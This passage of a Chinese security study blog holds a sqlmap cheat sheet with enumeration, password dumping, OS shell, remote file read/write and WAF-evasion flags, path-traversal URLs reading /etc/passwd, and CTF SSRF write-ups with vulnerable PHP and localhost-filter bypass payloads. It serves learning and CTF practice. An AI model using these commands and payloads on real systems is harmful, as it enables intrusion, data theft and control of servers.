SELECT”替换“UNION ALL SELECT”</span></span><br><span class="line">unmagicquotes.py 		<span class="comment"># 用一个多字节组合%bf%27和末尾通用注释一起替换空格符</span></span><br><span class="line">varnish.py 				<span class="comment"># 添加一个HTTP头“X-originating-IP”来绕过WAF</span></span><br><span class="line">versionedkeywords.py 		<span class="comment"># 用MySQL注释包围每个非函数关键字</span></span><br><span class="line">versionedmorekeywords.py 		<span class="comment"># 用MySQL注释包围每个关键字</span></span><br><span class="line">xforwardedfor.py 			<span class="comment"># 添加一个伪造的HTTP头“X-Forwarded-For”来绕过WAF</span></span><br></pre></td></tr></table></figure>



<h3 id="使用实例"><a href="#使用实例" class="headerlink" title="使用实例"></a>使用实例</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1、判断注入点和数据类型：</span><br><span class="line">     (1) sqlmap -u http://www.test.php?<span class="built_in">id</span>=1                 	<span class="comment">#GET方法注入</span></span><br><span class="line">     (2) sqlmap -r /etc/url.txt                             	<span class="comment">#POST方法注入(使用Burpsuite等代理工具拦截POST请求内容，将POST请求内容保存在一个文本文件中，此处为url.txt，并用sqlmap调用)</span></span><br><span class="line">2、判断数据库名(dbs)：sqlmap -u <span class="string">&quot;http://www.test.php?id=1&quot;</span> --dbs</span><br><span class="line">3、判断表名(tables)：sqlmap -u <span class="string">&quot;http://www.test.php?id=1&quot;</span> -D 数据库名 --tables</span><br><span class="line">4、判断列名(columns)：sqlmap -u <span class="string">&quot;http://www.test.php?id=1&quot;</span>-D 数据库名 -T 表名 --column</span><br><span class="line">5、获取字段: sqlmap -u <span class="string">&quot;http://www.test.php?id=1&quot;</span> -D 数据库名 -T 表名 -C 列名 --dump</span><br></pre></td></tr></table></figure>



<h3 id="进阶使用"><a href="#进阶使用" class="headerlink" title="进阶使用"></a>进阶使用</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://url/news?id=1&quot;</span> --current-user                              <span class="comment">#获取当前用户名称</span></span><br><span class="line">sqlmap -u <span class="string">&quot;http://url/news?id=1&quot;</span> --current-db                                <span class="comment">#获取当前数据库名称</span></span><br><span class="line">sqlmap -u <span class="string">&quot;http://url/news?id=1&quot;</span> --dbs                               		<span class="comment">#枚举所有数据库名</span></span><br><span class="line">sqlmap -u <span class="string">&quot;http://url/news?id=1&quot;</span> -D <span class="string">&quot;db_name&quot;</span> --tables                       <span class="comment">#列出指定数据库的表名</span></span><br><span class="line">sqlmap -u <span class="string">&quot;http://url/news?id=1&quot;</span> -D <span class="string">&quot;db_name&quot;</span> -T <span class="string">&quot;tablename&quot;</span> --columns       <span class="comment">#列列出指定数据库对应表的字段</span></span><br><span class="line">sqlmap -u <span class="string">&quot;http://url/news?id=1&quot;</span> -D <span class="string">&quot;db_name&quot;</span> -T <span class="string">&quot;table_name&quot;</span> -C <span class="string">&quot;column_name&quot;</span> --dump      <span class="comment">#获取字段内容</span></span><br><span class="line">sqlmap -u <span class="string">&quot;http://url/news?id=1&quot;</span> --dbms <span class="string">&quot;Mysql&quot;</span> --<span class="built_in">users</span>                      <span class="comment">#dbms指定数据库类型</span></span><br><span class="line">sqlmap -u <span class="string">&quot;http://url/news?id=1&quot;</span> --<span class="built_in">users</span>                                     <span class="comment">#列数据车用户</span></span><br><span class="line">sqlmap -u <span class="string">&quot;http://url/news?id=1&quot;</span> --passwords                                 <span class="comment">#数据库用户密码</span></span><br><span class="line">sqlmap -u <span class="string">&quot;http://url/news?id=1&quot;</span> --sql-shell/--os-cmd                        <span class="comment">#执行指定sql命令</span></span><br><span class="line">sqlmap -u <span class="string">&quot;http://url/news?id=1&quot;</span> --os-cmd=<span class="built_in">whoami</span>                             <span class="comment">#执行系统命令</span></span><br><span class="line">sqlmap -u <span class="string">&quot;http://url/news?id=1&quot;</span> --os-shell                                  <span class="comment">#系统交互shell</span></span><br><span class="line">sqlmap -u <span class="string">&quot;http://url/news?id=1&quot;</span> --dbs -o<span class="string">&quot;sqImap.log&quot;</span>                        <span class="comment">#保存进度</span></span><br><span class="line">sqlmap -u <span class="string">&quot;http://url/news?id=1&quot;</span> --dbs -o<span class="string">&quot;sqlmap.log&quot;</span> --resume               <span class="comment">#恢复已保存进度</span></span><br><span class="line">sqlmap -u <span class="string">&quot;http://url/news?id=1&quot;</span> --tamper <span class="string">&quot;base64encode.py&quot;</span>                  <span class="comment">#加载脚本(可利用绕过注入限制)</span></span><br><span class="line">sqlmap -u <span class="string">&quot;http://url/news?id=1&quot;</span> -p <span class="built_in">id</span>  								  <span class="comment">#指定注入参数</span></span><br><span class="line">sqlmap -u <span class="string">&quot;http://url/news?id=1&quot;</span> --dump-all                                  <span class="comment">#爆出该数据库中的所有数据</span></span><br><span class="line">sqlmap -u <span class="string">&quot;http://url/news?id=1&quot;</span> --proxy=<span class="string">&quot;http://127.0.0.1:8080&quot;</span>  		     <span class="comment">#指定代理</span></span><br><span class="line">sqlmap -u <span class="string">&quot;http://url/news?id=1&quot;</span> --delay=3 --force-ssl	     <span class="comment"># 当爆破HTTPS网站会出现超时的话，可以使用参数</span></span><br><span class="line">sqlmap -u <span class="string">&quot;http://url/news?id=1&quot;</span> --is-dba 								   <span class="comment">#判断当前用户是否有管理员权限</span></span><br><span class="line">sqlmap -u <span class="string">&quot;http://url/news?id=1&quot;</span> --identify-waf  						    <span class="comment"># 检测是否有WAF</span></span><br><span class="line">sqlmap -u <span class="string">&quot;http://url/news?id=1&quot;</span> --file-read <span class="string">&quot;c:/test.txt&quot;</span> <span class="comment">#读取目标服务器C盘下的test.txt文件</span></span><br><span class="line">sqlmap -u <span class="string">&quot;http://url/news?id=1&quot;</span> --file-write  test.txt  --file-dest <span class="string">&quot;e:/hack.txt&quot;</span>  <span class="comment">#将本地的test.txt文件上传到目标服务器的E盘下，并且名字为hack.txt</span></span><br><span class="line"> </span><br><span class="line">===================================================================================</span><br><span class="line"><span class="comment"># 过waf手法</span></span><br><span class="line">sqlmap -u <span class="string">&quot;http://url/news?id=1&quot;</span></span><br><span class="line">--random-agent                                         <span class="comment"># 使用任意的User-Agent爆破</span></span><br><span class="line">-v3                                                    <span class="comment"># 输出详细度，最大值5会显示请求包和回复包</span></span><br><span class="line">--threads 5                                            <span class="comment"># 指定线程数</span></span><br><span class="line">--fresh-queries                                        <span class="comment"># 清除缓存</span></span><br><span class="line">--flush-session                                        <span class="comment"># 清空会话，重构注入 </span></span><br><span class="line">--batch                                                <span class="comment"># 对所有的交互式的都是默认的</span></span><br><span class="line">--random-agent                                         <span class="comment"># 任意的http头</span></span><br><span class="line">--tamper <span class="string">&quot;base64encode.py &quot;</span>                            <span class="comment"># 对提交的数据进行base64编码</span></span><br><span class="line">--referer http://www.baidu.com                         <span class="comment"># 伪造referer字段</span></span><br><span class="line">--random-agent                                         <span class="comment"># 使用任意HTTP头进行绕过，尤其是在WAF配置不当的时候</span></span><br><span class="line">--time-sec=3                                           <span class="comment"># 使用长的延时来避免触发WAF的机制，这方式比较耗时</span></span><br><span class="line">--hpp                                                  <span class="comment"># 使用HTTP 参数污染进行绕过，尤其是在ASP.NET/IIS 平台上</span></span><br><span class="line">--proxy=http://127.0.0.1:7890                          <span class="comment"># 使用代理进行绕过</span></span><br><span class="line">--ignore-proxy   								    <span class="comment"># 禁止使用系统的代理，直接连接进行注入</span></span><br><span class="line">--flush-session  								    <span class="comment"># 清空会话，重构注入</span></span><br><span class="line">--hex 或者 --no-cast    							   <span class="comment"># 进行字符码转换</span></span><br><span class="line">--mobile         							         <span class="comment"># 对移动端的服务器进行注入</span></span><br><span class="line">--tor           							         <span class="comment"># 匿名注入</span></span><br></pre></td></tr></table></figure>



<h3 id="直接使用"><a href="#直接使用" class="headerlink" title="直接使用"></a>直接使用</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">&quot;https://www.vuln.cn/post.php?id=1&quot;</span> --force-ssl  --proxy <span class="string">&quot;http://127.0.0.1:7890&quot;</span> --batch --dbs</span><br><span class="line">python sqlmap.py  -u <span class="string">&quot;http://www.vuln.cn&quot;</span> –cookie <span class="string">&quot;id=11&quot;</span> --level 2</span><br><span class="line">python sqlmap.py -u <span class="string">&quot;www.xxxx.com/product/detail/id/3*.html&quot;</span> --dbms=mysql -v 3 </span><br><span class="line">python sqlmap.py -r <span class="string">&quot;c:\request.txt&quot;</span> -p <span class="built_in">id</span> –dbms mysql –file-read=<span class="string">&quot;e:\www\as\config.php&quot;</span></span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>任意文件读取漏洞</title>
    <url>/2025/03/18/SSRF/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h1 id="任意文件读取漏洞"><a href="#任意文件读取漏洞" class="headerlink" title="任意文件读取漏洞"></a>任意文件读取漏洞</h1><p>允许攻击者在服务器上读取任何文件，而不仅仅是哪些应该公开访问的文件。</p>
<h2 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h2><p>某些Web应用通过参数传递文件名，然后将文件内容直接包含到页面中。如果没有对传入的文件名进行严格的验证，攻击者可能传递恶意文件路径，从而读取服务器上的敏感内容</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://example.com/index.php?page=../../../../etc/passwd</span><br></pre></td></tr></table></figure>



<h2 id="路径遍历漏洞"><a href="#路径遍历漏洞" class="headerlink" title="路径遍历漏洞"></a>路径遍历漏洞</h2><p>这种漏洞发生在用户输入的文件路径未经过验证直接用于文件操作的情况下。攻击者可以利用  ..&#x2F; 这样的路径遍历序列访问超出预期目录的文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://example.com/download?file=../../../../etc/passwd</span><br></pre></td></tr></table></figure>



<h2 id="文件解析漏洞"><a href="#文件解析漏洞" class="headerlink" title="文件解析漏洞"></a>文件解析漏洞</h2><p>一些Web应用程序允许用户上传文件，但没有正确验证上传文件的类型和内容，攻击者可以上传一个恶意文件，然后通过解析这个文件读取服务器上的其他文件</p>
]]></content>
      <categories>
        <category>计算机</category>
      </categories>
      <tags>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title>网络协议</title>
    <url>/2025/03/18/SSRF/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h3 id="URL的一般格式"><a href="#URL的一般格式" class="headerlink" title="URL的一般格式"></a>URL的一般格式</h3><p><code>&lt;协议&gt;://&lt;主机&gt;:&lt;端口&gt;/&lt;路径&gt;</code></p>
<ul>
<li>协议</li>
<li>主机：指该主机在互联网上的域名，一个URL中也可以使用IP作为域名</li>
<li>端口：跟在域名后，以“：”作为分割符。默认端口是80</li>
<li>路径：协议和主机部分，字母不区分大小写。但是路径有时要区分大小写</li>
</ul>
<h2 id="File协议"><a href="#File协议" class="headerlink" title="File协议"></a>File协议</h2><p>file协议也叫本地文件传输协议，主要用于访问本地计算机中的文件。</p>
<h5 id="基本格式"><a href="#基本格式" class="headerlink" title="基本格式"></a>基本格式</h5><p><code>file:///D:/mywebproject/bigwatermelon/index.html</code></p>
<h3 id="HTTP协议"><a href="#HTTP协议" class="headerlink" title="HTTP协议"></a>HTTP协议</h3><p><code>http://127.0.0.1:5500/pocon041</code></p>
]]></content>
      <categories>
        <category>计算机</category>
      </categories>
      <tags>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF-SHOW刷题记录Web5</title>
    <url>/2025/03/18/SSRF/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h1 id="CTFshow"><a href="#CTFshow" class="headerlink" title="CTFshow"></a>CTFshow</h1><h2 id="Web351"><a href="#Web351" class="headerlink" title="Web351"></a>Web351</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);			<span class="comment">#关闭所有错误报告，防止错误信息泄露给用户</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);	<span class="comment">#高亮显示当前文件</span></span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];			<span class="comment">#使用POST方法传递参数url，赋值给变量$url，这里并没有验证用户的输入</span></span><br><span class="line"><span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);		<span class="comment">#初始化cURL会话，用户提供的URL将被用于发起HTTP请求</span></span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);			<span class="comment">#表示不包含响应头在输出中</span></span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);	<span class="comment">#让curl_exec返回获取的内容不是直接输出</span></span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);		<span class="comment">#执行curl_exec，结果存入$result</span></span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);			<span class="comment">#关闭会话</span></span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$result</span>);				<span class="comment">#输出结果</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="前置基础讲解"><a href="#前置基础讲解" class="headerlink" title="前置基础讲解"></a>前置基础讲解</h4><p>curl_exec函数用于执行给定的cURL会话</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 创建一个cURL资源</span></span><br><span class="line"><span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置URL和相应的选项</span></span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="string">&quot;http://www.w3cschool.cc/&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 抓取URL并把它传递给浏览器</span></span><br><span class="line"><span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 关闭cURL资源，并且释放系统资源</span></span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url=127.0.0.1/flag.php</span><br><span class="line"></span><br><span class="line">url=file:///var/www/html/flag.php</span><br></pre></td></tr></table></figure>

<ul>
<li>为什么是127.0.0.1（localhost）？因为这样可以通过SSRF漏洞让服务器向自己发起请求，利用本地换回地址绕过外部防火墙或访问限制</li>
<li>&#x2F;var是Linux系统中存放可变数据的目录</li>
<li>&#x2F;var&#x2F;www通常是Web服务器存放网页文件的默认位置</li>
<li>html目录是Web服务器的文档根目录，所有可通过Web访问的文件都应放在这里</li>
</ul>
<h2 id="Web352"><a href="#Web352" class="headerlink" title="Web352"></a>Web352</h2><h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/localhost|127.0.0/&#x27;</span>))&#123;</span><br><span class="line">        <span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        <span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="keyword">echo</span> (<span class="variable">$result</span>);</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> hacker</span><br></pre></td></tr></table></figure>

<h4 id="前置基础知识"><a href="#前置基础知识" class="headerlink" title="前置基础知识"></a>前置基础知识</h4><h5 id="parse-url函数"><a href="#parse-url函数" class="headerlink" title="parse_url函数"></a>parse_url函数</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">parse_url</span>(参数<span class="number">1</span>，参数<span class="number">2</span>)</span><br></pre></td></tr></table></figure>

<p>参数1：必填，是一个完整的url</p>
<p>参数2：非必填，是一个大写参数变量，直接获取结果集的一部分</p>
<p>参数2如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PHP_URL_SCHEME、 PHP_URL_HOST、 PHP_URL_PORT、 PHP_URL_USER、 PHP_URL_PASS、 PHP_URL_PATH、 PHP_URL_QUERY 、 PHP_URL_FRAGMENT</span><br></pre></td></tr></table></figure>

<p>函数解析一个URL并返回一个关联数组，包含在URL中出现的各种组成部分</p>
<p>关联数组：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">Array</span></span><br><span class="line">(</span><br><span class="line">    [scheme] =&gt; http</span><br><span class="line">    [host] =&gt; hostname</span><br><span class="line">    [user] =&gt; username</span><br><span class="line">    [pass] =&gt; password</span><br><span class="line">    [path] =&gt; /path</span><br><span class="line">    [query] =&gt; arg=value</span><br><span class="line">    [fragment] =&gt; anchor</span><br><span class="line">)</span><br><span class="line">/path</span><br></pre></td></tr></table></figure>

<h5 id="die函数"><a href="#die函数" class="headerlink" title="die函数"></a>die函数</h5><p>die()函数输出一条消息，并退出当前脚本。是exit()函数的别名</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">die</span>(message) <span class="comment">#信息用&#x27;&#x27;括起来</span></span><br></pre></td></tr></table></figure>

<h5 id="preg-match函数"><a href="#preg-match函数" class="headerlink" title="preg_match函数"></a>preg_match函数</h5><p><a href="https://www.runoob.com/php/php-preg_match.html">https://www.runoob.com/php/php-preg_match.html</a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> <span class="title function_ invoke__">preg_match</span> ( <span class="keyword">string</span> <span class="variable">$pattern</span> , <span class="keyword">string</span> <span class="variable">$subject</span> [, <span class="keyword">array</span> &amp;<span class="variable">$matches</span> [, <span class="keyword">int</span> <span class="variable">$flags</span> = <span class="number">0</span> [, <span class="keyword">int</span> <span class="variable">$offset</span> = <span class="number">0</span> ]]] )</span><br></pre></td></tr></table></figure>

<ul>
<li>$pattern：要搜索的模式，字符串形式</li>
<li>$subject：输入字符串</li>
</ul>
<p>中括号表示可选参数，括号的嵌套表现了其嵌套关系</p>
<h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>这里要求url必须是http(s)协议，并且不能包含127.0.0.1和localhost。这里可以将IP转化为长整型</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0111 1111 0000 0000 0000 0000 0000 0001</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2130706433</span><br></pre></td></tr></table></figure>

<h3 id="构建payload"><a href="#构建payload" class="headerlink" title="构建payload"></a>构建payload</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url=http://2130706433/flag.php</span><br></pre></td></tr></table></figure>

<h3 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h3><p>这里真的有限制吗？实则不然</p>
<p>preg_match参数没有给全 :nerd_face:</p>
<h2 id="Web353"><a href="#Web353" class="headerlink" title="Web353"></a>Web353</h2><h3 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/localhost|127\.0\.|\。/i&#x27;</span>, <span class="variable">$url</span>))&#123;</span><br><span class="line">        <span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        <span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="keyword">echo</span> (<span class="variable">$result</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> hacker</span><br></pre></td></tr></table></figure>

<p>直接用上一道题的思路也可以做</p>
<h3 id="其他思路"><a href="#其他思路" class="headerlink" title="其他思路"></a>其他思路</h3><ol>
<li>127&#x2F;172开头就代表内网地址，不一定非得127.0.0.1</li>
<li>Linux中0表示自身的地址，可以使用<a href="http://0.0.0.0/flag.php%E7%BB%95%E8%BF%87">http://0/flag.php绕过</a></li>
<li>使用sudo.cc代替127.0.0.1</li>
</ol>
<h2 id="Web354"><a href="#Web354" class="headerlink" title="Web354"></a>Web354</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/localhost|1|0|。/i&#x27;</span>, <span class="variable">$url</span>))&#123;</span><br><span class="line">        <span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        <span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="keyword">echo</span> (<span class="variable">$result</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> hacker</span><br></pre></td></tr></table></figure>

<h3 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h3><p>url过滤包含1和0</p>
<ol>
<li>使用解析到127.0.0.1的url（302跳转）</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://safe.taobao.com/</span><br><span class="line"></span><br><span class="line">http://114.taobao.com/</span><br><span class="line"></span><br><span class="line">http://wifi.aliyun.com/</span><br><span class="line"></span><br><span class="line">http://imis.qq.com/</span><br><span class="line"></span><br><span class="line">http://localhost.sec.qq.com/</span><br><span class="line"></span><br><span class="line">http://ecd.tencent.com/</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>使用sudo.cc</li>
</ol>
<h2 id="Web355"><a href="#Web355" class="headerlink" title="Web355"></a>Web355</h2><h3 id="题目-3"><a href="#题目-3" class="headerlink" title="题目"></a>题目</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$host</span>=<span class="variable">$x</span>[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>((<span class="title function_ invoke__">strlen</span>(<span class="variable">$host</span>)&lt;=<span class="number">5</span>))&#123;</span><br><span class="line">        <span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        <span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="keyword">echo</span> (<span class="variable">$result</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span 